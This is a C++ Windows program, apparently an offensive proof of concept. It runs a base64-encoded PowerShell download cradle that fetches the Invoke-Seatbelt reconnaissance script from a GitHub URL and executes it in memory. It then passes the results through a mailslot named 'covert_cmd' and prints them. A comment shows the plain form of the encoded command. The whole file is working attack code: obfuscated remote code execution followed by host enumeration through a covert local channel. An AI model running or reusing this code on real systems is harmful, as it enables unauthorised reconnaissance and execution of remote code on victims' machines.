#include <stdio.h>
#include <windows.h>
#include <string>
#include <iostream>

using namespace std;

LPCTSTR MS_name = TEXT("\\\\.\\mailslot\\covert_cmd"); //Define a local mailslot according to the naming convention.
string fileread_buffer, cmd_output, output, mailslot_output = "";
DWORD bytes_written, bytes_read, msg_size;
bool result;

string ExecCommand(string cmd) {
	char buffer[127];
	FILE* pipe = _popen(cmd.c_str(), "r");
	while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
		output += buffer;
	}
	output += '\0';
	_pclose(pipe);
	return output;
}

int main() {
	//powershell - c iex(New - Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/refs/heads/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); invoke - seatbelt;
	cmd_output = ExecCommand("powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAFMAMwBjAHUAcgAzAFQAaAAxAHMAUwBoADEAdAAvAFAAbwB3AGUAcgBTAGgAYQByAHAAUABhAGMAawAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAcwB0AGUAcgAvAFAAbwB3AGUAcgBTAGgAYQByAHAAQgBpAG4AYQByAGkAZQBzAC8ASQBuAHYAbwBrAGUALQBTAGUAYQB0AGIAZQBsAHQALgBwAHMAMQAnACkAOwAgAEkAbgB2AG8AawBlAC0AUwBlAGEAdABiAGUAbAB0AA==");

	//Create a mailslot
	HANDLE MS_handle = CreateMailslot(MS_name, 0, 0, NULL);
	if (MS_handle == INVALID_HANDLE_VALUE) { printf("[-] MailSlot creation failed. (ERROR: %d)", GetLastError()); return -1; }

	//Get a handle to the created mailslot
	HANDLE file_handle = CreateFile(MS_name,GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if (file_handle == INVALID_HANDLE_VALUE) { printf("[-] File Creation Failed. %d", GetLastError()); return -1; }

	//Write the command output to a mailslot
	result = WriteFile(file_handle, cmd_output.c_str(), cmd_output.size(), &bytes_written, NULL);
	if (!result) { printf("[-] MailSlot Write failed. %d", GetLastError()); return -1; }

	//Check if the mailslot has new messages
	result = GetMailslotInfo(MS_handle, 0, &msg_size, 0, 0);
	if (!result) { printf("[-] GetInfo failed. %d", GetLastError());}
	else if (msg_size != (DWORD)MAILSLOT_NO_MESSAGE) { 
		printf("[+] Message Found! (Size: %d)\n", msg_size);
	}
	//Allocate memory for the message and read the contents of the mailslot into it 
	char* buff = (char*)malloc(msg_size);
	result = ReadFile(MS_handle, buff, msg_size, &bytes_read, 0);
	if (!result) { printf("[-] Read Failed. %d", GetLastError()); return(-1); }
	printf("%s", buff);
	
	//Cleanup
	free(buff);
	CloseHandle(file_handle);
	CloseHandle(MS_handle);
}